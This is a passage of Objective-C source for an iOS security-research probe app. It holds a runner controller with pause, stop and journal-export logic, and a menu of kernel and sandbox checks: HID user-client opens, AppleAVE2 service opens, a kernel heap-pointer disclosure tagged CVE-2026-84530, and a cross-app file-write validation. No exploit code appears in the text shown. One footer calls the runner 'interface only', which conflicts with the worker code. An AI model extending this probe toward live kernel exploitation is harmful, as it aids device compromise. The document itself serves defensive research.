                    [NSThread sleepForTimeInterval:paused ? 0.2 : 1.0];
                    if (!paused) delay++;
                }
            }
            [log record:@"worker_end" session:session
                 method:[NSString stringWithFormat:@"%lu",(unsigned long)method]
                 attempt:@"" details:@{@"iterations":@(iteration)}];
            [[NSOperationQueue mainQueue] addOperationWithBlock:^{
                ForcePageController *strongSelf=weakSelf;
                if (!strongSelf || ![strongSelf->_activeSession isEqualToString:session]) return;
                strongSelf->_outstanding--;
                strongSelf->_status.text=[NSString stringWithFormat:
                    @"Session %@: %ld worker(s) remain. Last completed method %lu. Journal: %@",
                    session,(long)strongSelf->_outstanding,(unsigned long)method,log.path];
                if (strongSelf->_outstanding==0) {
                    [log record:@"session_end" session:session method:@"runner"
                        attempt:@"" details:@{
                            @"stopped":@(strongSelf->_stopping),
                            @"completed_checks":@(strongSelf->_completedChecks),
                            @"observed_changes":@(strongSelf->_changedStates),
                            @"errors":@(strongSelf->_failedChecks)}];
                    NSDictionary *report=ForceResearchReport(log.path);
                    strongSelf->_researchPreview.text=ForceResearchMemo(report);
                    strongSelf->_activeSession=nil;
                    strongSelf->_forceQueue=nil;
                    strongSelf->_pauseButton.enabled=NO;
                }
            }];
        }];
    }
    _status.text=[NSString stringWithFormat:@"Started %@ with %lu method(s).",session,(unsigned long)chosen.count];
}
- (void)togglePause:(id)sender {
    if (!_activeSession) return;
    @synchronized(self) {
        NSTimeInterval now=NSProcessInfo.processInfo.systemUptime;
        if (!_paused) {
            _paused=YES;
            _pausedAt=now;
        } else {
            _pausedTotal+=now-_pausedAt;
            _pausedAt=0;
            _paused=NO;
        }
    }
    [_pauseButton setTitle:_paused ? @"Resume" : @"Pause" forState:UIControlStateNormal];
    [[ForceLog shared] record:_paused ? @"paused" : @"resumed"
        session:_activeSession method:@"runner" attempt:@""
        details:@{@"completed_checks":@(_completedChecks)}];
    _liveSummary.text=[NSString stringWithFormat:@"%@ • %ld completed • %ld errors",
        _paused ? @"Paused" : @"Running",
        (long)_completedChecks,(long)_failedChecks];
}
- (void)forceBackgrounded:(NSNotification *)notification {
    if (_activeSession) {
        [[ForceLog shared] record:@"app_background" session:_activeSession
            method:@"lifecycle" attempt:@"" details:@{@"note":@"Foreground-only runner stopping"}];
        [self stopForce:nil];
    }
}
- (void)forceForegrounded:(NSNotification *)notification {
    [[ForceLog shared] record:@"app_foreground" session:@"lifecycle"
        method:@"lifecycle" attempt:@"" details:@{}];
}
- (void)dealloc {
    [[NSNotificationCenter defaultCenter] removeObserver:self];
}
- (void)stopForce:(id)sender {
    @synchronized(self) {
        _stopping=YES;
        if (_paused) {
            _pausedTotal+=NSProcessInfo.processInfo.systemUptime-_pausedAt;
            _pausedAt=0;
            _paused=NO;
        }
    }
    _pauseButton.enabled=NO;
    if (_activeSession)
        [[ForceLog shared] record:@"stop_requested" session:_activeSession
            method:@"runner" attempt:@"" details:@{}];
    _status.text=@"Stop requested; workers finish the current bounded operation.";
}

- (void)exportResearchPackage:(id)sender {
    ForceLog *journal=[ForceLog shared];
    NSDictionary *report=ForceResearchReport(journal.path);
    NSError *error=nil;
    NSData *data=[NSJSONSerialization dataWithJSONObject:report
        options:NSJSONWritingPrettyPrinted|NSJSONWritingSortedKeys error:&error];
    if (!data) {
        _status.text=[NSString stringWithFormat:@"Report creation failed: %@",error.localizedDescription];
        return;
    }
    NSString *reportPath=[[journal.path stringByDeletingLastPathComponent]
        stringByAppendingPathComponent:@"force-research-report.json"];
    if (![data writeToFile:reportPath options:NSDataWritingAtomic error:&error]) {
        _status.text=[NSString stringWithFormat:@"Report write failed: %@",error.localizedDescription];
        return;
    }
    NSString *memo=ForceResearchMemo(report);
    NSString *memoPath=[[journal.path stringByDeletingLastPathComponent]
        stringByAppendingPathComponent:@"force-research-briefing.txt"];
    NSError *memoError=nil;
    if (![memo writeToFile:memoPath atomically:YES
                   encoding:NSUTF8StringEncoding error:&memoError]) {
        _status.text=[NSString stringWithFormat:@"Memo write failed: %@",
            memoError.localizedDescription ?: @"unknown"];
        return;
    }
    _researchPreview.text=memo;
    UIActivityViewController *share=[[UIActivityViewController alloc]
        initWithActivityItems:@[[NSURL fileURLWithPath:memoPath],
            [NSURL fileURLWithPath:reportPath],
            [NSURL fileURLWithPath:journal.path]] applicationActivities:nil];
    share.popoverPresentationController.sourceView=(UIView *)sender;
    [self presentViewController:share animated:YES completion:nil];
}
- (void)exportJournal:(id)sender {
    NSString *path=[ForceLog shared].path;
    if (![[NSFileManager defaultManager] fileExistsAtPath:path]) {
        _status.text=@"No journal file exists yet.";
        return;
    }
    UIActivityViewController *activity=[[UIActivityViewController alloc]
        initWithActivityItems:@[[NSURL fileURLWithPath:path]] applicationActivities:nil];
    activity.popoverPresentationController.sourceView=(UIView *)sender;
    [self presentViewController:activity animated:YES completion:nil];
}
@end

@interface ProbeHomeController : UITableViewController
@end
@implementation ProbeHomeController
- (instancetype)init {
    self = [super initWithStyle:UITableViewStyleInsetGrouped];
    return self;
}
- (void)viewDidLoad {
    [super viewDidLoad];
    self.title = @"Research Tests";
    self.tableView.rowHeight = UITableViewAutomaticDimension;
    self.tableView.estimatedRowHeight = 60;
}
- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView {
    return 5;
}
- (NSString *)tableView:(UITableView *)tableView titleForHeaderInSection:(NSInteger)section {
    return @[@"App data", @"HID / IOHIDFamily", @"Kernel services", @"Kernel information leaks", @"Research runner"][section];
}
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
    return section == 0 ? 1 : (section == 1 ? 4 : 1);
}
- (NSString *)nameAt:(NSIndexPath *)indexPath {
    if (indexPath.section == 0) return @"Erosion file-change validation";
    if (indexPath.section == 2) return @"AppleAVE2 and service opens";
    if (indexPath.section == 3) return @"AIO kqueue CVE-2026-84530";
    if (indexPath.section == 4) return @"Force — live diagnostics";
    return @[@"HID service reachability",
             @"HID provider inventory",
             @"HID manager class opens",
             @"AOPTouch FastPath type 2"][indexPath.row];
}
- (NSString *)noteAt:(NSIndexPath *)indexPath {
    if (indexPath.section == 0) return @"Existing cross-app data-file write validation";
    if (indexPath.section == 2) return @"One-time service access checks";
    if (indexPath.section == 3) return @"AIO work-entry heap pointer disclosure, read-only";
    if (indexPath.section == 4) return @"Live checks, advanced signing review and JSONL export";
    return @[@"Registered services; manager connection",
             @"Registry only — no connection opens",
             @"Standard HID manager client opens",
             @"User-client type 2 open only — no exploit"][indexPath.row];
}
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:@"ResearchTest"];
    if (!cell) cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle
                                             reuseIdentifier:@"ResearchTest"];
    cell.textLabel.text = [self nameAt:indexPath];
    cell.detailTextLabel.text = [self noteAt:indexPath];
    cell.detailTextLabel.numberOfLines = 0;
    cell.accessoryType = UITableViewCellAccessoryDisclosureIndicator;
    return cell;
}
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
    [tableView deselectRowAtIndexPath:indexPath animated:YES];
    UIViewController *page;
    if (indexPath.section == 0) {
        page = [ContainerChangeController new];
    } else if (indexPath.section == 2) {
        page = [ProbeController new];
    } else if (indexPath.section == 3) {
        page = [AIODisclosureController new];
    } else if (indexPath.section == 4) {
        page = [ForcePageController new];
    } else {
        page = [[HIDReachabilityController alloc] initWithTestMode:(HIDTestMode)indexPath.row];
    }
    [self.navigationController pushViewController:page animated:YES];
}
- (NSString *)tableView:(UITableView *)tableView titleForFooterInSection:(NSInteger)section {
    if (section == 0)
        return @"An Erosion write to the probe's own Documents file was already verified. This page does not grant cross-app access itself.";
    if (section == 1)
        return @"These are historical research checks, not kernel memory access. No tests run automatically.";
    if (section == 2) return @"Do not repeat completed access checks without a new question to test.";
    if (section == 3) return @"CVE-2026-84530 reveals an AIO heap allocation address, not code execution.";
    return @"Force Step 1: interface only. It does not run diagnostics or fuzz kernel interfaces.";
}
@end

@interface ProbeAppDelegate : UIResponder <UIApplicationDelegate>
@property(nonatomic,strong) UIWindow *window;
@end
@implementation ProbeAppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    self.window.rootViewController = [[UINavigationController alloc] initWithRootViewController:[ProbeHomeController new]];
    [self.window makeKeyAndVisible];
    return YES;
}
@end
int main(int argc, char **argv) {
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([ProbeAppDelegate class])); }
}
